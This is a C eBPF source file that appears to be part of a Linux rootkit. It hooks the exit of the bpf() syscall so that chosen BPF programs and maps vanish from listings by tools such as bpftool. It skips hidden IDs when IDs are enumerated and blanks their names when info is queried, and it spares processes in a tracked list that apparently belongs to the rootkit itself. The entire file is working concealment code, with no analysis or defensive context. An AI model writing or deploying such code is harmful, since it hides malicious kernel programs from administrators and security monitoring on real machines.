#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

/**
 * @brief Hook sys_bpf exit point attempting to filter out bpf entries.
 * 
 */
SEC("fexit/__x64_sys_bpf")
int BPF_PROG(hide_bpf_objects, struct pt_regs *regs, long ret)
{
    /* Ignore failed bpf() syscalls */
    if (ret < 0)
        return 0;

    /* Not hiding from hidden processes */
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
        return 0;

    /* Extract parameters from regs */
    int cmd = (int)PT_REGS_PARM1_CORE(regs);
    union bpf_attr *attr = (union bpf_attr *)PT_REGS_PARM2_CORE(regs);

    if (!attr)
        return 0;

    /* bpftool iterating next IDs (BPF_PROG_GET_NEXT_ID / BPF_MAP_GET_NEXT_ID) */
    if (cmd == BPF_PROG_GET_NEXT_ID || cmd == BPF_MAP_GET_NEXT_ID) {
        u32 next_id = 0;
        
        if (bpf_probe_read_user(&next_id, sizeof(next_id), &attr->next_id) != 0)
            return 0;

        /* Doing this to prevent returing 0 and making bpf syscall loop */
        for (int i = 0; i < 10; i++) {
            u8 *is_hidden = bpf_map_lookup_elem(&hide_bpf_ids_map, &next_id);
            if (is_hidden && *is_hidden == 1) {
                next_id++; /* Move to the next candidate ID */
                bpf_probe_write_user(&attr->next_id, &next_id, sizeof(next_id));
            } else {
                break; /* Reached a visible ID */
            }
        }
    }

    /* bpftool querying detailed info by FD (BPF_OBJ_GET_INFO_BY_FD) */
    else if (cmd == BPF_OBJ_GET_INFO_BY_FD) {
        union bpf_attr kattr = { 0 };
        if (bpf_probe_read_user(&kattr, sizeof(kattr), attr) != 0)
            return 0;

        void *u_info = (void *)(uintptr_t)kattr.info.info;
        if (!u_info)
            return 0;

        u32 id = 0;
        /* Read the 'id' field from userspace struct info */
        if (bpf_probe_read_user(&id, sizeof(id), u_info + offsetof(struct bpf_prog_info, id)) != 0)
            return 0;

        u8 *is_hidden = bpf_map_lookup_elem(&hide_bpf_ids_map, &id);
        if (is_hidden && *is_hidden == 1) {
            char empty_name[MAX_NAME_LEN] = {0};
            void *u_name = u_info + offsetof(struct bpf_prog_info, name);
            bpf_probe_write_user(u_name, empty_name, sizeof(empty_name));
        }
    }

    return 0;
}
